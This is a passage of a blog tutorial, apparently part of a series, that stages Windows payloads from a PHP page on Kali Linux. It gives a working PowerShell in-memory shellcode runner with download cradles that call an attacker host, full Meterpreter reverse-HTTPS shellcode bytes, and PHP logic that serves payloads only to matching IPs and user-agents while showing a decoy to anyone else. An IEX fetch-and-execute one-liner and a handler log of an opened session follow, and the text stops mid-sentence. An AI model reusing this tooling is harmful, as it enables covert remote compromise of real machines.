+We will modify our download cradle to leverage the use of the `WebClient` class. As we learned from our previous topic, the shellcode will be initially treated as a string, which will not work. In order for the shellcode to be accepted by the shellcode runner, we'll need to convert it to a _byte aray_ by splitting the string into a variable that's been casted as a byte array.
+
+```powershell
+PS C:\> $WC = New-Object System.Net.WebClient
+PS C:\> $WC.Headers.Add('user-agent','Mozilla/5.0 (X11; Linux x86_64; rv:102.00) Gecko/20100101 Firefox/102.00')
+PS C:\> $WC.Headers.Add('Client-IP','192.168.0.29')
+PS C:\> [Byte[]]$buf = $WC.DownloadString('http://192.168.0.21/payload.php?handler') -split ','
+```
+
+We'll add this download cradle into our shellcode runner.
+
+```powershell
+function LookupFunc {
+    Param (
+        $moduleName, 
+        $functionName
+    )
+    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $tmp = @()
+    $assem.GetMethods() | ForEach-Object { If ($_.Name -eq 'GetProcAddress') { $tmp += $_ } }
+    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
+}
+
+function getDelegateType {
+    Param (
+        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
+        [Parameter(Position = 1)] [Type] $delType = [Void]
+    )
+    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
+    DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
+    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')
+    return $type.CreateType()
+}
+
+$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
+$WC = New-Object System.Net.WebClient
+$WC.Headers.Add('user-agent','Mozilla/5.0 (X11; Linux x86_64; rv:102.00) Gecko/20100101 Firefox/102.00')
+$WC.Headers.Add('Client-IP','192.168.0.29')
+[Byte[]]$buf = $WC.DownloadString('http://192.168.0.21/payload.php?handler') -split ','
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
+$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread),(getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0, $lpMem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
+```
+
+Once we execute it on our victim machine, we receive a reverse meterpreter shell.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST 192.168.0.21; set LPORT 443; set EXITFUNC thread; exploit"
+[*] Using configured payload generic/shell_reverse_tcp
+PAYLOAD => windows/x64/meterpreter/reverse_https
+LHOST => 192.168.0.21
+LPORT => 443
+EXITFUNC => thread
+[*] Started HTTPS reverse handler on https://192.168.0.21:443
+[!] https://192.168.0.21:443 handling request from 192.168.0.26; (UUID: hnc2ktg3) Without a database connected that payload UUID tracking will not work!
+[*] https://192.168.0.21:443 handling request from 192.168.0.26; (UUID: hnc2ktg3) Staging x64 payload (201820 bytes) ...
+[!] https://192.168.0.21:443 handling request from 192.168.0.26; (UUID: hnc2ktg3) Without a database connected that payload UUID tracking will not work!
+[*] Meterpreter session 1 opened (192.168.0.21:443 -> 192.168.0.26:50281) at 2022-10-05 08:50:18 -0400
+
+meterpreter > 
+
+```
+
+Up to this point everything has been relatively straight forward. Now we'll start kicking it up a notch.
+
+### Staged Script
+
+The third and final payload we will look at will be the entire shellcode runner we just wrote. What will make this payload different is that we will keep the download cradle to retrieve the shellcode within the payload and change our `payload.php` file to accommodate the retrieval of both our script and the embedded shellcode retrieval that won't step on each other.
+
+There are a number of ways you can store the contents of a script in PHP, but the method I prefer is to use the _file_get_contents_ function. This function reads the content of a file that can be printed back to a client. We'll use this function in lieu of having to bloat our web page with more code. What's going to make this a little more complicated is up to this point our payloads only needed a single download cradle in conjunction with a single set of conditions to retrieve that payload. Now we'll change it up by setting up our page to retrieve multiple payloads with different conditions.
+
+We will start off by updating our code by spitting the shellcode and script into two different functions called _payload_shellcode_ and _payload_script_.
+
+```php
+function payload_shellcode() {
+    $payload = '0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x51,0x56,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x4d,0x31,0xc9,0x48,0xf,0xb7,0x4a,0x4a,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x66,0x81,0x78,0x18,0xb,0x2,0xf,0x85,0x72,0x0,0x0,0x0,0x8b,0x80,0x88,0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67,0x48,0x1,0xd0,0x8b,0x48,0x18,0x50,0x44,0x8b,0x40,0x20,0x49,0x1,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x4d,0x31,0xc9,0x48,0x1,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x1,0xd0,0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40,0x1c,0x49,0x1,0xd0,0x41,0x8b,0x4,0x88,0x48,0x1,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,0x6e,0x65,0x74,0x0,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,0x7,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x0,0x0,0x0,0x0,0xff,0xd5,0xe8,0xd,0x0,0x0,0x0,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x30,0x2e,0x32,0x31,0x0,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0xbb,0x1,0x0,0x0,0x4d,0x31,0xc9,0x53,0x53,0x6a,0x3,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x0,0x0,0x0,0x0,0xff,0xd5,0xe8,0x1f,0x0,0x0,0x0,0x2f,0x57,0x30,0x37,0x34,0x69,0x4e,0x45,0x31,0x70,0x48,0x56,0x69,0x75,0x57,0x4f,0x37,0x41,0x62,0x63,0x6e,0x34,0x51,0x75,0x77,0x69,0x34,0x52,0x49,0x57,0x0,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,0x0,0x32,0xa8,0x84,0x0,0x0,0x0,0x0,0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0xa,0x5f,0x48,0x89,0xf1,0x6a,0x1f,0x5a,0x52,0x68,0x80,0x33,0x0,0x0,0x49,0x89,0xe0,0x6a,0x4,0x41,0x59,0x49,0xba,0x75,0x46,0x9e,0x86,0x0,0x0,0x0,0x0,0xff,0xd5,0x4d,0x31,0xc0,0x53,0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,0x49,0xc7,0xc2,0x2d,0x6,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,0xc7,0xc1,0x88,0x13,0x0,0x0,0x49,0xba,0x44,0xf0,0x35,0xe0,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0xff,0xcf,0x74,0x2,0xeb,0xaa,0xe8,0x55,0x0,0x0,0x0,0x53,0x59,0x6a,0x40,0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x0,0x10,0x0,0x0,0x49,0xba,0x58,0xa4,0x53,0xe5,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0x0,0x20,0x0,0x0,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x7,0x48,0x1,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x0,0x59,0xbb,0xe0,0x1d,0x2a,0xa,0x41,0x89,0xda,0xff,0xd5';
+    echo $payload;
+}
+
+function payload_runner(){
+    $payload = file_get_contents('/home/kali/payloads/shellcode-runner.ps1');
+    echo $payload;
+}
+```
+
+Next we'll change up our _if statements_  to handle multiple conditions. The first statement will be used to check if we're trying to retrieve the shellcode runner and a second statement will be added within an _else clause_ to check if we're trying to retrieve the shellcode itself. We are going to keep the conditions to retrieve the shellcode the same as before, but we're going to require a different user-agent, IP address and parameter to retrieve the script. 
+
+```php
+$ip = callerIp('192.168.0.29');
+$agent = callerAgent('Mozilla/5.0 (X11; Linux x86_64; rv:102.01) Gecko/20100101 Firefox/102.01');
+$param = callerParam('session');
+
+if ($ip && $agent && $param) {
+    payload_runner();
+} else {
+    $ip = callerIp('192.168.0.29');
+    $agent = callerAgent('Mozilla/5.0 (X11; Linux x86_64; rv:102.00) Gecko/20100101 Firefox/102.00');
+    $param = callerParam('handler');
+    if ($ip && $agent && $param) {
+        payload_shellcode();
+    } else {
+        decoy();
+    }
+}
+```
+
+Since our cradle for our shellcode is already within our original script, we'll start up a listener and use a different download cradle to retrieve and execute our shellcode runner.
+
+```powershell
+PS C:\> $((Invoke-WebRequest http://192.168.0.21/payload.php?session -UserAgent 'Mozilla/5.0 (X11; Linux x86_64; rv:102.01) Gecko/20100101 Firefox/102.01' -Headers @{'X-Forwarded-For' = '192.168.0.29'}).Content) | IEX
+```
+
+Looking at our access logs, we see the requests to retrieve our script and shellcode followed by a successful reverse shell. 
+
+![](./Screenshots/php-17.png)
+
+While it does add a bit of complexity, we now have a better idea on what it takes to stage scripts as well as a means to handle multiple requests for different payloads that won't stumble upon each other. 
+
+### Wrapping Up
+
+We have gone through the process of hosting a PHP web page on Kali Linux and how we can use it to stage payloads that are hidden behind a wall of conditional access requirements. We also briefly touched on the concept of decoy content. Keep your eye out for the final post in this series where we'll illustrate the use of TCP sockets to host and deliver staged payloads, but not without 
+
